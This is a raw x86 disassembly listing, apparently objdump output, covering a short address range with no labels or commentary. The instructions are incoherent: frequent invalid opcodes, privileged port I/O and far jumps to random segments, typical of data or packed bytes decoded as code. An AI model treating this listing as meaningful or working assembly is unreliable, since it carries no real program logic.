  4117d2:	loope  0x4117d6
  4117d4:	adc    eax,0x343ec910
  4117d9:	jp     0x4117db
  4117db:	in     eax,dx
  4117dc:	sti    
  4117dd:	call   0xcbb1:0xb0b0a0eb
  4117e4:	(bad)  
  4117e5:	and    eax,DWORD PTR [esi+0x55]
  4117e8:	outs   dx,BYTE PTR ds:[esi]
  4117e9:	jne    0x4117f8
  4117eb:	aas    
  4117ec:	mov    ecx,0xe680d2ba
  4117f1:	xchg   esp,eax
  4117f2:	adc    BYTE PTR [ebp-0x5a1d1c4a],ch
  4117f8:	jmp    0x229b:0x180f21c8
  4117ff:	out    0x87,eax
  411801:	aam    0xaf
  411803:	and    ch,0x79
  411806:	inc    ebp
  411807:	and    BYTE PTR [esi+0x50933ee8],bh
  41180d:	dec    ebp
  41180e:	mov    edi,0xa75c848e
  411813:	mov    al,0xe3
  411815:	pusha  
  411816:	or     al,cl
  411818:	inc    ebp
  411819:	xchg   edx,eax
  41181a:	ret    0xb9e
  41181d:	jmp    0x8480:0x43cf2fc6
  411824:	mov    esi,0xb7783c42
  411829:	je     0x411844
  41182b:	out    0x73,eax
  41182d:	or     eax,0xaa15c64e
  411832:	xchg   ebp,eax
  411833:	jmp    0x411851
  411835:	lds    edi,FWORD PTR [edi+0x3bc2829e]
  41183b:	pop    ss
  41183c:	ja     0x411802
  41183e:	and    DWORD PTR [esi],esp
  411840:	mov    DWORD PTR [ecx+0x45],edi
  411843:	xor    eax,0xbeb6d246
  411848:	add    ebx,0xf9d6b303
  41184e:	add    ebp,DWORD PTR [ecx-0x35]
  411851:	sbb    bl,BYTE PTR [edi]
  411853:	or     BYTE PTR [edx],bh
  411855:	call   0xbe85:0x95649c25
  41185c:	mov    esi,0x4cf25ffd
  411861:	add    al,0x57
  411863:	mov    bh,dh
  411865:	loope  0x411816
  411867:	nop
  411868:	mov    ds:0x2dcd3ae9,eax
  41186d:	data16 xor ch,BYTE PTR [ecx-0x5e]
  411871:	pop    edi
  411873:	adc    BYTE PTR [edx+ecx*1],al
  411876:	cs js  0x411831
  411879:	inc    edi
  41187a:	mov    ds:0xd4682df7,al
  41187f:	jge    0x41183d
  411881:	push   es
  411882:	sub    ah,BYTE PTR [edx+0x29]
  411885:	xor    eax,DWORD PTR [edi+0x66]
  411888:	or     al,BYTE PTR [ecx]
  41188a:	sbb    al,0xf
  41188c:	inc    ebp
  41188d:	push   ebp
  41188e:	mov    esp,0x6f5575d5
  411893:	mov    ds:0x4c4c7427,eax
  411898:	imul   ecx,DWORD PTR [edi-0x14],0x650f1c46
  41189f:	in     al,0xb1
  4118a1:	add    al,bl
  4118a3:	cmp    BYTE PTR [eax],dl
  4118a5:	call   0xd0c2:0x2d14898d
  4118ac:	jne    0x41189c
  4118ae:	push   ss
  4118af:	push   esi
  4118b0:	inc    esi
  4118b1:	mov    dl,0x41
  4118b4:	loop   0x411897
  4118b6:	in     al,dx
  4118b7:	and    DWORD PTR [ebx+0x659a1b8a],eax
  4118bd:	in     al,dx
  4118be:	xchg   edi,eax
  4118bf:	cmp    DWORD PTR [eax+0x4b],0xffffff9e
  4118c3:	and    edi,DWORD PTR [ecx-0x59534435]
  4118c9:	je     0x4118d8
  4118cb:	out    dx,eax
  4118cc:	pop    ebx
  4118cd:	inc    esp
  4118ce:	pop    ebx
  4118cf:	ins    DWORD PTR es:[edi],dx
  4118d0:	in     eax,0xc4
  4118d2:	hlt    
  4118d3:	fnstenv [esp+edx*8+0x6fa07f2a]
  4118da:	jnp    0x41187e
  4118dc:	mov    eax,0xbc244bb2
  4118e1:	loope  0x4118d4
  4118e3:	sbb    dl,BYTE PTR [edx+0x55]
  4118e6:	dec    edx
  4118e7:	pop    esp
  4118e8:	mov    eax,ds:0x94f947d
  4118ed:	jg     0x411875
  4118ef:	and    BYTE PTR [ebx-0x22],dh
  4118f2:	fwait
  4118f3:	xor    bl,ah
  4118f5:	xchg   ebp,eax
  4118f6:	lods   al,BYTE PTR ds:[esi]
  4118f7:	pop    esp
  4118f8:	das    
  4118f9:	dec    esp
  4118fa:	sbb    bh,BYTE PTR [eax+0x13]
  4118fd:	in     al,0x6
  4118ff:	mov    bl,0x11
  411901:	pushf  
  411902:	add    dh,BYTE PTR [ebx-0x7be44b11]
  411908:	lock rol DWORD PTR [ebx+ebp*1],1
  41190c:	mov    esp,0xdb74c302
  411911:	xchg   edx,eax
  411912:	push   es
  411913:	or     DWORD PTR [ecx+0x37c2fdfb],edx
  411919:	sub    dh,al
  41191b:	(bad)  
  41191c:	cmp    dh,BYTE PTR [esi+eiz*2]
  41191f:	dec    edi
  411920:	fsub   QWORD PTR [ecx]
  411922:	sbb    esp,DWORD PTR [edi-0x1e]
  411925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411926:	loop   0x411957
  411928:	(bad)  
  411929:	shl    dl,0x7f
  41192c:	or     eax,0xb0703432
  411931:	ror    ecx,cl
  411933:	sahf   
  411934:	ror    cl,0x7e
  411937:	mov    cs,WORD PTR [edx+edx*1-0x7d]
  41193b:	push   0x17
  41193d:	ins    BYTE PTR es:[edi],dx
  41193e:	outs   dx,BYTE PTR ds:[esi]
  41193f:	sub    cl,dl
  411941:	lods   al,BYTE PTR ds:[esi]
  411942:	xchg   BYTE PTR [esi],cl
  411944:	and    BYTE PTR [eax-0x2b],ah
  411947:	add    eax,0x53f7cb3f
  41194c:	sbb    ebp,DWORD PTR [edi-0x34]
  41194f:	les    edx,FWORD PTR [edi+edx*8]
  411952:	idiv   BYTE PTR [eax]
  411954:	push   eax
  411955:	outs   dx,BYTE PTR ds:[esi]
  411956:	rcr    BYTE PTR [edx],cl
  411958:	call   0x56b9:0x7ef189f5
  41195f:	inc    ebp
  411960:	sub    esi,DWORD PTR [edx]
  411962:	jg     0x411970
  411964:	jo     0x4119cf
  411966:	and    ebp,eax
  411968:	rcl    DWORD PTR [ecx],1
  41196a:	test   BYTE PTR [ebp-0xb43b7a2],dh
  411970:	or     ebx,DWORD PTR [eax+ebp*8-0x28]
  411974:	outs   dx,BYTE PTR ds:[esi]
  411975:	adc    eax,DWORD PTR [ebx-0x69]
  411978:	(bad)  [ebp-0x64a26fde]
  41197e:	xchg   ecx,eax
  41197f:	jno    0x4119ef
  411981:	enter  0x9e60,0xdd
  411985:	call   0x858f:0xb713a343
  41198c:	inc    edi
  41198d:	(bad)  
  41198e:	xchg   esp,eax
  41198f:	push   eax
  411990:	jmp    0xeac7:0xbbb3a6fc
  411997:	mov    cl,0x29
  411999:	icebp  
  41199a:	pop    edi
  41199b:	aam    0x19
  41199d:	jmp    0x41196c
  41199f:	mov    edx,0x9cbc796a
  4119a4:	cld    
  4119a5:	mov    BYTE PTR [edx+0x68],ah
  4119a8:	test   cl,dl
  4119aa:	push   cs
  4119ab:	mov    BYTE PTR [eax-0x3ac58d37],cl
  4119b1:	adc    eax,ebp
  4119b3:	jne    0x4119b0
  4119b5:	xor    BYTE PTR [eax-0x23b05570],0xba
  4119bc:	push   0x2bb22777
  4119c1:	cmp    ah,BYTE PTR [edx]
  4119c3:	aam    0xc7
  4119c5:	push   0xdc92816e
  4119ca:	push   cs
  4119cb:	(bad)  
  4119cc:	inc    eax
  4119ce:	mov    bh,0x64
  4119d0:	iret   
  4119d1:	pop    esi
  4119d2:	imul   ecx,edx,0x218cf274
  4119d8:	or     BYTE PTR [edi-0x590c3643],0x29
  4119df:	dec    edx
  4119e0:	and    DWORD PTR [ebp+0xa],edx
  4119e3:	mov    ds:0x771857f7,eax
  4119e8:	xchg   BYTE PTR [edx-0x2d3d51af],dl
  4119ee:	dec    eax
  4119ef:	mov    edx,0x82d775ca
  4119f4:	std    
  4119f5:	dec    esi
  4119f6:	push   edi
  4119f7:	push   eax
  4119f8:	pop    eax
  4119f9:	jne    0x411a3b
  4119fb:	rol    DWORD PTR [ecx-0x4514a50f],cl
  411a01:	push   ds
  411a02:	pushf  
  411a03:	xchg   ecx,eax
  411a04:	or     esp,DWORD PTR [esi-0x64916ee6]
  411a0a:	adc    eax,0x654fd5da
  411a0f:	sahf   
  411a10:	fcom   DWORD PTR gs:[ecx-0x5f]
  411a14:	jns    0x411a41
  411a16:	add    eax,0x181e7452
  411a1b:	bound  ecx,QWORD PTR [edx-0x39]
  411a1e:	aad    0x5a
  411a20:	mov    ?,WORD PTR [edi-0x1b]
  411a23:	adc    al,ch
  411a25:	cli    
  411a26:	mov    bh,0xec
  411a28:	stos   BYTE PTR es:[edi],al
  411a29:	retf   
  411a2a:	jp     0x411a56
  411a2c:	call   0xbdf88e3c
  411a31:	adc    al,0xa1
  411a33:	es and al,0x77
  411a36:	lock xor esi,DWORD PTR [esi+edx*1+0x4749905e]
  411a3e:	in     al,dx
  411a3f:	sub    ah,bh
  411a41:	mov    DWORD PTR [ecx+0x7ee284a6],ecx
  411a47:	pushf  
  411a48:	xor    BYTE PTR [edx+ebp*1],dl
  411a4b:	push   cs
  411a4c:	lahf   
  411a4d:	mov    ss:0x695e5e1e,al
  411a53:	arpl   dx,ax
  411a55:	arpl   WORD PTR [ebp+0x42275337],si
  411a5b:	loope  0x411a2d
  411a5d:	call   0x5f1f:0x52120485
  411a64:	(bad)  
  411a66:	neg    DWORD PTR [ebx-0x64d57243]
  411a6c:	and    DWORD PTR [ebp+0x4b837ec6],ebx
  411a72:	jge    0x411ade
  411a74:	stc    
  411a75:	add    ecx,DWORD PTR [eax-0x48]
  411a78:	and    DWORD PTR [edx-0x3368cf31],esi
  411a7e:	stos   DWORD PTR es:[di],eax
  411a80:	shl    BYTE PTR [esi+0x56],cl
  411a83:	mov    al,ds:0x2525ffe8
  411a89:	xchg   BYTE PTR [esp+ebx*8],cl
  411a8c:	jmp    0x2ab0:0x12ef952
  411a93:	in     eax,0x1
  411a95:	dec    esi
  411a96:	nop
  411a97:	lahf   
  411a98:	leave  
  411a99:	repz test al,0xc9
  411a9c:	aad    0xf3
  411a9e:	mov    ds:0x4913f88b,al
  411aa3:	inc    ebp
  411aa4:	cmp    edi,DWORD PTR ds:0x76b4121c
  411aaa:	(bad)  
  411aab:	pusha  
  411aac:	push   edx
  411aad:	jbe    0x411abf
  411aaf:	loope  0x411b2e
  411ab1:	repz jo 0x411a7c
  411ab4:	adc    edi,DWORD PTR [edi+edx*4+0x2]
  411ab8:	add    bh,BYTE PTR [edi-0x2e13906c]
  411abe:	jmp    0x7e40561a
  411ac3:	mov    ds:0xb2c2ef2,al
  411ac8:	cwde   
  411ac9:	(bad)  
  411aca:	ins    DWORD PTR es:[edi],dx
  411acb:	inc    ebx
  411acc:	ret    
  411acd:	sar    BYTE PTR [ecx-0x2a0ba18d],cl
  411ad3:	mov    ecx,0xa3d7ddfd
  411ad8:	mov    ah,0x18
  411ada:	mov    cl,0xe
  411adc:	jg     0x411af3
  411ade:	fldcw  WORD PTR [edx+0x6d]
  411ae1:	dec    esi
  411ae2:	daa    
  411ae3:	dec    edi
  411ae4:	outs   dx,DWORD PTR ds:[esi]
  411ae5:	pop    edi
  411ae6:	ds jmp 0xe46af9ee
  411aec:	arpl   ax,sp
  411aee:	mov    eax,0xb4c486a9
  411af3:	inc    ecx
  411af4:	mov    eax,ds:0xc6934c77
  411af9:	push   ss
  411afa:	xchg   BYTE PTR [esi],al
  411afc:	xor    al,0xc6
  411afe:	xchg   ebp,eax
  411aff:	psadbw mm0,QWORD PTR [ebp+0x201798bd]
  411b06:	mov    dl,0xc5
  411b08:	jp     0x411b6c
  411b0a:	cmp    BYTE PTR [ecx-0x746a452f],al
  411b10:	cld    
  411b11:	cmp    esp,DWORD PTR [esi]
  411b13:	mov    eax,ds:0x69e38f02
  411b18:	adc    DWORD PTR [edi-0x6e6eff41],0x90e79357
  411b22:	fisub  DWORD PTR [esi]
  411b24:	lahf   
  411b25:	xor    edi,DWORD PTR [ebp-0x24347ea5]
  411b2b:	imul   edx,ecx,0x4a
  411b2e:	mov    dh,0x42
  411b30:	inc    edi
  411b31:	retf   
  411b32:	xchg   ebx,eax
  411b33:	add    bl,BYTE PTR [ebp-0x538ce259]
  411b39:	sub    DWORD PTR [ebp-0x46ff9f6],esp
  411b3f:	int3   
  411b40:	clc    
  411b41:	outs   dx,BYTE PTR ds:[esi]
  411b42:	push   ebp
  411b43:	jg     0x411b23
  411b45:	ins    BYTE PTR es:[edi],dx
  411b46:	retf   0xa690
  411b49:	lods   eax,DWORD PTR ds:[esi]
  411b4a:	mov    bl,0x5a
  411b4c:	mov    WORD PTR [esi+ecx*4-0x7ba4b38a],?
  411b53:	and    ch,BYTE PTR [ecx]
  411b55:	xchg   esp,eax
  411b56:	push   ss
  411b57:	cmp    BYTE PTR [esi+eax*8+0x54],dl
  411b5b:	xor    edi,DWORD PTR [edx-0x34]
  411b5e:	in     al,dx
  411b5f:	test   cl,dh
  411b61:	shr    BYTE PTR [edi],cl
  411b63:	clc    
  411b64:	leave  
  411b65:	pop    es
  411b66:	or     DWORD PTR [edi+0x6947f448],edx
  411b6c:	pop    ebx
  411b6d:	mov    cl,0x20
  411b6f:	pop    edi
  411b70:	pop    ebp
  411b71:	pop    esi
  411b72:	aad    0x71
  411b74:	out    0x65,al
  411b76:	jmp    0xcc9f:0x4196f7d4
  411b7d:	adc    edx,esp
  411b7f:	and    BYTE PTR [eax+0xa],ah
  411b82:	sub    al,0x3
  411b84:	xchg   ebx,eax
  411b85:	test   DWORD PTR [edi-0x629f992a],eax
  411b8b:	fistp  DWORD PTR es:[edi+esi*8+0x199ad77f]
  411b93:	dec    esi
  411b94:	ret    0xf95d
  411b97:	sbb    esp,esi
  411b99:	inc    eax
  411b9a:	sbb    esi,DWORD PTR [eax+0x39]
  411b9d:	jg     0x411b67
  411b9f:	lahf   
  411ba0:	cdq    
  411ba1:	pop    ax
  411ba3:	mov    bh,0xde
  411ba5:	jbe    0x411b3c
  411ba7:	pushf  
  411ba8:	and    dh,0x94
  411bab:	fstp   TBYTE PTR [esi+0x5]
  411bae:	out    0x80,eax
  411bb0:	stc    
  411bb1:	push   cs
  411bb2:	(bad)  
  411bb3:	imul   ecx,DWORD PTR [eax+0x41],0x95c34a43
  411bba:	mov    ah,0xfd
  411bbc:	clc    
  411bbd:	jne    0x411c31
  411bbf:	mov    esi,0x27ee8b77
  411bc4:	mov    ds:0xd1ca2d4a,al
  411bc9:	cmp    DWORD PTR [edi],esi
  411bcb:	adc    esi,DWORD PTR es:0xe7acc34
  411bd2:	ror    DWORD PTR [ebp+0x269a4028],0x5b
  411bd9:	xchg   edi,eax
  411bda:	in     eax,0x36
  411bdc:	fwait
  411bdd:	dec    ebx
  411bde:	push   0x66bf199b
  411be3:	dec    ebx
  411be4:	or     ebp,ecx
  411be6:	jns    0x411c66
  411be8:	test   al,0xdc
  411bea:	in     al,dx
  411beb:	pop    edi
  411bec:	jg     0x411b93
  411bee:	fsubr  QWORD PTR [eax-0x7963582]
  411bf4:	mov    al,0x55
  411bf6:	fidiv  WORD PTR [esi+0x375ea0eb]
  411bfc:	pop    ebx
  411bfd:	dec    eax
  411bfe:	mov    al,BYTE PTR [edx]
  411c00:	mov    cl,0x67
  411c02:	fmul   DWORD PTR [ecx+0x4bcdbde0]
  411c08:	ja     0x411bc3
  411c0a:	cmp    DWORD PTR [eax-0x53b52ef9],edi
  411c10:	mov    ch,0xa2
  411c12:	xchg   edi,eax
  411c13:	mov    eax,0x80650131
  411c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c19:	test   ebp,edi
  411c1b:	bound  esp,QWORD PTR [edx+0x43]
  411c1e:	rcl    DWORD PTR [ebx],cl
  411c20:	or     ebp,DWORD PTR [ecx-0x17]
  411c23:	xchg   DWORD PTR [eax+0xff7e80f],esi
  411c29:	mov    ecx,0x8fa639b1
  411c2e:	sub    eax,0xe00e1b83
  411c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c34:	aas    
  411c35:	loopne 0x411c8b
  411c37:	pop    ss
  411c38:	jb     0x411c02
  411c3a:	sahf   
  411c3b:	and    DWORD PTR [ebx-0x6b33abe4],esp
  411c41:	lods   eax,DWORD PTR ds:[esi]
  411c42:	cld    
  411c43:	and    dl,BYTE PTR [edi+0x157efd2b]
  411c49:	add    BYTE PTR [ebp+0x732bd9ae],ch
  411c4f:	mov    eax,ds:0xf4e052cc
  411c54:	mov    bh,0x37
  411c56:	jns    0x411cd1
  411c58:	jae    0x34f9fb59
  411c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c5f:	cdq    
  411c60:	popf   
  411c61:	add    bh,BYTE PTR [ecx+eax*4]
  411c64:	cmp    DWORD PTR ds:0x7fa57e48,ebp
  411c6a:	dec    esp
  411c6b:	jge    0x411cd8
  411c6d:	sbb    eax,0x131fa7d2
  411c72:	push   eax
  411c73:	pop    ecx
  411c74:	arpl   WORD PTR [ebp-0x75],dx
  411c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c78:	jns    0x411c86
  411c7a:	(bad)  
  411c7b:	icebp  
  411c7c:	inc    esp
  411c7d:	data16 (bad) 
  411c7f:	adc    edx,DWORD PTR [esi]
  411c81:	xchg   edx,eax
  411c82:	jg     0x411c8d
  411c84:	ret    0xee20
  411c87:	test   BYTE PTR [esi],dl
  411c89:	mov    ebp,0x1961e4c8
  411c8e:	rol    DWORD PTR [ebx+0x0],0x2c
  411c92:	call   DWORD PTR [ebp+0x4fd0d404]
  411c98:	test   BYTE PTR [ebp+0xf],cl
  411c9b:	push   ss
  411c9c:	mov    bh,BYTE PTR [edx+0x2abe8fdf]
  411ca2:	stc    
  411ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca4:	in     eax,0x1d
  411ca6:	dec    esi
  411ca7:	mov    edi,?
  411ca9:	jo     0x411cd8
  411cab:	aas    
  411cac:	je     0x411cad
  411cae:	out    dx,al
  411caf:	je     0x411cc5
  411cb1:	ftst   
  411cb3:	mov    BYTE PTR ds:[ecx+0x4a],bh
  411cb7:	sbb    BYTE PTR [ebp+0x0],bl
  411cba:	push   0xffffff94
  411cbc:	pop    eax
  411cbd:	pushf  
  411cbe:	and    BYTE PTR [ebp+0xb],0x6c
  411cc2:	(bad)  
  411cc3:	or     al,0xd8
  411cc5:	dec    ecx
  411cc6:	pop    ebx
  411cc7:	cmp    DWORD PTR [ebp+0x778acf95],esp
  411ccd:	xor    eax,0xa4415b7a
  411cd2:	push   eax
  411cd3:	add    bl,BYTE PTR [esi+0x16]
  411cd6:	jl     0x411d56
  411cd8:	mov    ds:0x1283d5c7,al
  411cdd:	outs   dx,DWORD PTR ds:[esi]
  411cde:	jecxz  0x411cef
  411ce0:	ins    BYTE PTR es:[edi],dx
  411ce1:	push   ds
  411ce2:	idiv   DWORD PTR [eax+0x4bf9d0f7]
  411ce8:	fwait
  411ce9:	inc    ebp
  411cea:	and    dh,ah
  411cec:	out    dx,eax
  411ced:	sahf   
  411cee:	mov    ebp,0xe907c8f1
  411cf3:	cdq    
  411cf4:	(bad)  [edi-0x29]
  411cf7:	mov    ds:0x70295bcc,eax
  411cfc:	jle    0x411d53
  411cfe:	cs iret 
  411d00:	push   es
  411d01:	into   
  411d02:	mov    esp,0x37a7e044
  411d07:	add    BYTE PTR [ecx+0x51a3d7fb],0x7e
  411d0e:	in     eax,0x6d
  411d10:	adc    BYTE PTR [ebp-0x6a],dh
  411d13:	inc    ebp
  411d14:	xor    eax,0xea1a3684
  411d19:	mov    ebp,DWORD PTR [ecx+0x3c22b227]
  411d1f:	and    ch,BYTE PTR [ecx]
  411d21:	mov    ebp,0x578f6b18
  411d26:	xrelease xchg BYTE PTR [ebx],dh
  411d29:	lods   al,BYTE PTR ds:[esi]
  411d2a:	(bad)  
  411d2b:	rcr    cl,1
  411d2d:	sub    bl,dl
  411d2f:	cmp    BYTE PTR [esi],ch
  411d31:	xchg   esp,eax
  411d32:	jecxz  0x411ce6
  411d34:	inc    ecx
  411d35:	lds    esp,FWORD PTR [ebp-0x67f9e87a]
  411d3b:	call   0xceff5d27
  411d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d41:	mov    ds:0xdb5de78b,eax
  411d46:	cmp    edx,esi
  411d48:	push   es
  411d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d4a:	(bad)  
  411d4b:	mov    eax,ds:0xa482da31
  411d50:	dec    eax
  411d51:	pop    esp
  411d52:	stc    
  411d53:	lods   eax,DWORD PTR ds:[esi]
  411d54:	retf   0x82c
  411d57:	sub    ch,BYTE PTR [ebp-0x6f1dd61a]
  411d5d:	jb     0x411d65
  411d5f:	call   0x6d32:0x798816e7
  411d66:	idiv   BYTE PTR [eax-0x69e5e664]
  411d6c:	aaa    
  411d6d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d6f:	popa   
  411d70:	aas    
  411d71:	jmp    0x411d5c
  411d73:	xor    eax,DWORD PTR [eax+0x4f]
  411d76:	outs   dx,BYTE PTR ds:[esi]
  411d77:	out    dx,eax
  411d78:	cs push es
  411d7a:	outs   dx,BYTE PTR ds:[esi]
  411d7b:	or     cl,dl
  411d7d:	adc    eax,0x2d97e50
  411d82:	js     0x411ddc
  411d84:	shl    BYTE PTR [eax+0x3e7871f4],cl
  411d8a:	cmc    
  411d8b:	addr16 xchg bh,al
  411d8e:	sahf   
  411d8f:	mov    dh,0xcb
  411d91:	icebp  
  411d92:	jo     0x411d77
  411d94:	hlt    
  411d95:	es repz dec ebx
  411d98:	jecxz  0x411e16
  411d9a:	les    ebx,FWORD PTR [ebp+0x3]
  411d9d:	xor    DWORD PTR [edi],0x6df54165
  411da3:	jns    0x411dcb
  411da5:	sahf   
  411da6:	fbld   TBYTE PTR [edx-0x12]
  411da9:	fdiv   QWORD PTR [ecx-0xd]
  411dac:	enter  0xf278,0xf4
  411db0:	retf   0xc3a5
  411db3:	mov    esi,0x67333459
  411db8:	push   eax
  411db9:	je     0x411d4c
  411dbb:	xchg   BYTE PTR [ebx],cl
  411dbd:	loopne 0x411e1a
  411dbf:	mov    eax,0xa9e8fa55
  411dc4:	push   eax
  411dc5:	fisubr DWORD PTR ds:0x416aa6b0
  411dcb:	and    ebp,DWORD PTR [edi]
  411dcd:	xor    al,0xe
  411dcf:	dec    esp
  411dd0:	xor    DWORD PTR [ebx-0x18],esi
  411dd3:	and    BYTE PTR [ebx+0x28],ch
  411dd6:	and    bh,0x75
  411dd9:	aaa    
  411dda:	bound  eax,QWORD PTR [edi+0x51777cf2]
  411de0:	jbe    0x411d87
  411de2:	pop    es
  411de3:	and    ebp,ecx
  411de5:	out    0x83,eax
  411de7:	xor    DWORD PTR [edi-0x44259f17],ebp
  411ded:	std    
  411dee:	mov    WORD PTR [edi],ss
  411df0:	push   ss
  411df1:	ret    0x8974
  411df4:	and    eax,0x6261fe85
  411df9:	jmp    0xf2b1:0x3ed7d853
  411e00:	pop    ecx
  411e01:	xchg   ebx,eax
  411e02:	(bad)  
  411e04:	test   eax,0x50d2f5b7
  411e09:	jmp    0xe7bcb3f7
  411e0e:	inc    ecx
  411e0f:	pop    ds
  411e10:	jbe    0x411d98
  411e12:	popf   
  411e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e14:	(bad)  
  411e15:	stc    
  411e16:	cmc    
  411e17:	fwait
  411e18:	pop    esp
  411e19:	iret   
  411e1a:	cmp    eax,0xb32b3c6d
  411e1f:	je     0x411e87
  411e21:	aam    0x78
  411e23:	adc    eax,esp
  411e25:	sahf   
  411e26:	jl     0x411e01
  411e28:	push   ss
  411e29:	dec    eax
  411e2a:	inc    eax
  411e2b:	sar    cl,cl
  411e2d:	cmp    eax,DWORD PTR [eax-0x5b066beb]
  411e33:	in     al,0x3
  411e35:	jmp    0x18e4:0xde9176c
  411e3c:	jl     0x411e61
  411e3e:	cmc    
  411e3f:	xchg   ecx,eax
  411e40:	xchg   ebp,eax
  411e41:	jno    0x411e66
  411e43:	aad    0x4e
  411e45:	rol    DWORD PTR ds:0x4eb655cd,cl
  411e4b:	mov    al,0x36
  411e4d:	mov    ebp,0xedbdfcf8
  411e52:	inc    ebp
  411e53:	jae    0x411e22
  411e55:	mov    al,ds:0xaa0262fd
  411e5a:	push   esp
  411e5b:	out    0x83,eax
  411e5d:	add    edx,DWORD PTR [edx+0x9939727]
  411e63:	pop    eax
  411e64:	int3   
  411e65:	xchg   DWORD PTR [edi],eax
  411e67:	dec    edi
  411e68:	jle    0x411df7
  411e6a:	retf   
  411e6b:	dec    ecx
  411e6c:	pop    edx
  411e6d:	in     al,dx
  411e6e:	fucomi st,st(2)
  411e70:	fld    TBYTE PTR ds:0x45265976
  411e76:	sub    BYTE PTR [edi+0x5a],dl
  411e79:	add    al,0x4d
  411e7b:	mov    edi,0x9c6851cf
  411e80:	jbe    0x411e93
  411e82:	pop    ebp
  411e83:	arpl   WORD PTR [edi-0x50],bp
  411e86:	or     edx,DWORD PTR [edi+edx*4]
  411e89:	dec    edx
  411e8a:	out    0x83,eax
  411e8c:	or     BYTE PTR [ecx-0x2e],al
  411e8f:	dec    esp
  411e90:	arpl   WORD PTR [edi+0x60],dx
  411e93:	xchg   BYTE PTR [eax],bh
  411e95:	(bad)  
  411e97:	mov    ecx,es
  411e99:	loope  0x411e7a
  411e9b:	and    al,0xb3
  411e9d:	nop
  411e9e:	mov    dl,ah
  411ea0:	retf   
  411ea1:	cdq    
  411ea2:	jae    0x411ea3
  411ea4:	adc    dl,ah
  411ea6:	out    0xcb,eax
  411ea8:	lahf   
  411ea9:	mov    WORD PTR [eax],cs
  411eab:	mov    cl,0x80
  411ead:	(bad)  
  411eae:	ja     0x411e70
  411eb0:	xor    dh,0xb0
  411eb3:	mov    edi,0x92ec2a53
  411eb8:	pop    ebp
  411eb9:	sub    esi,0x537ec9f5
  411ebf:	xor    al,0x3a
  411ec1:	out    0x5e,al
  411ec3:	inc    dh
  411ec5:	scas   al,BYTE PTR es:[edi]
  411ec6:	mov    eax,0xb270eb16
  411ecb:	in     eax,dx
  411ecc:	inc    ecx
  411ecd:	ja     0x411f1d
  411ecf:	or     DWORD PTR [edx],0xffffffab
  411ed2:	jecxz  0x411e6a
  411ed4:	push   ecx
  411ed5:	inc    esi
  411ed6:	stos   BYTE PTR es:[edi],al
  411ed7:	cmp    eax,0x3e90bd61
  411edc:	dec    ebx
  411edd:	(bad)  
  411ede:	or     bh,BYTE PTR [eax-0x41]
  411ee1:	popa   
  411ee2:	stos   BYTE PTR es:[edi],al
  411ee3:	scas   al,BYTE PTR es:[edi]
  411ee4:	ss (bad) 
  411ee6:	dec    ebx
  411ee7:	inc    eax
  411ee8:	(bad)  
  411ee9:	retf   
  411eea:	std    
  411eeb:	pop    ss
  411eec:	adc    al,0xce
  411eee:	(bad)  
  411eef:	xor    eax,0x26c277cf
  411ef4:	lds    esp,FWORD PTR [ebp-0x78]
  411ef7:	out    0x4e,al
  411ef9:	pop    eax
  411efa:	mov    ebp,0x92a25d96
  411eff:	repz test eax,0xfdb4b11a
  411f05:	xlat   BYTE PTR ds:[ebx]
  411f06:	inc    eax
  411f07:	into   
  411f08:	mov    ds:0xe8326d27,eax
  411f0d:	adc    BYTE PTR [eax+ecx*8+0x21],al
  411f11:	imul   ecx,DWORD PTR [eax],0x61
  411f14:	xchg   edi,eax
  411f15:	pop    ds
  411f16:	xchg   ebp,eax
  411f17:	fwait
  411f18:	shr    DWORD PTR [esi-0x28],0x6b
  411f1c:	cmp    ah,bl
  411f1e:	stos   DWORD PTR es:[edi],eax
  411f1f:	dec    edi
  411f20:	rcr    BYTE PTR [ebp+0x6dcb7ee],cl
  411f26:	xor    al,0x94
  411f28:	(bad)  
  411f29:	dec    ecx
  411f2a:	cmp    BYTE PTR [bx+di-0x32],al
  411f2e:	dec    esi
  411f2f:	push   es
  411f30:	(bad)  
  411f31:	(bad)  
  411f32:	loopne 0x411ef4
  411f34:	sbb    ebp,ebp
  411f36:	push   cs
  411f37:	sub    DWORD PTR ds:0x442f3ecf,ebx
  411f3d:	in     al,dx
  411f3e:	and    dl,0xea
  411f41:	pop    ds
  411f42:	cmp    BYTE PTR fs:[ecx],bh
  411f45:	mov    eax,ds:0x36ea6bfd
  411f4a:	dec    edi
  411f4b:	xor    al,0xf9
  411f4d:	retf   0x4dbd
  411f50:	cwde   
  411f51:	sbb    eax,0xce65ac90
  411f56:	dec    edi
  411f57:	sbb    dh,BYTE PTR ds:0xf80d1509
  411f5d:	shl    BYTE PTR [ebp-0xb22398b],1
  411f63:	(bad)
  411f67:	iret   
  411f68:	cwde   
  411f69:	push   ecx
  411f6a:	jo     0x411f9c
  411f6c:	add    edx,DWORD PTR [ecx]
  411f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f6f:	cdq    
  411f70:	loopne 0x411f0e
  411f72:	pop    eax
  411f73:	or     edx,DWORD PTR [ebx+edi*8-0x57fd8e21]
  411f7a:	sub    edi,edx
  411f7c:	test   DWORD PTR [di+0x62db],esi
  411f81:	push   ds
  411f82:	push   ecx
  411f83:	sar    BYTE PTR [edi],cl
  411f85:	sahf   
  411f86:	(bad)  
  411f87:	aaa    
  411f88:	cld    
  411f89:	or     al,0x9a
  411f8b:	inc    ebx
  411f8c:	std    
  411f8d:	add    DWORD PTR [edi+0x49],0x192ca510
  411f94:	fisttp DWORD PTR [eax-0x1b9085c6]
  411f9a:	pop    DWORD PTR [ebp-0x4d]
  411f9d:	test   eax,0xcd30e5ee
  411fa2:	adc    eax,0xc4077015
  411fa7:	xchg   ebx,eax
  411fa8:	and    ecx,DWORD PTR [edi]
  411faa:	test   BYTE PTR [ebx+0x33],0xdb
  411fae:	mov    ebx,0x32ac074d
  411fb3:	add    BYTE PTR [esi],0x81
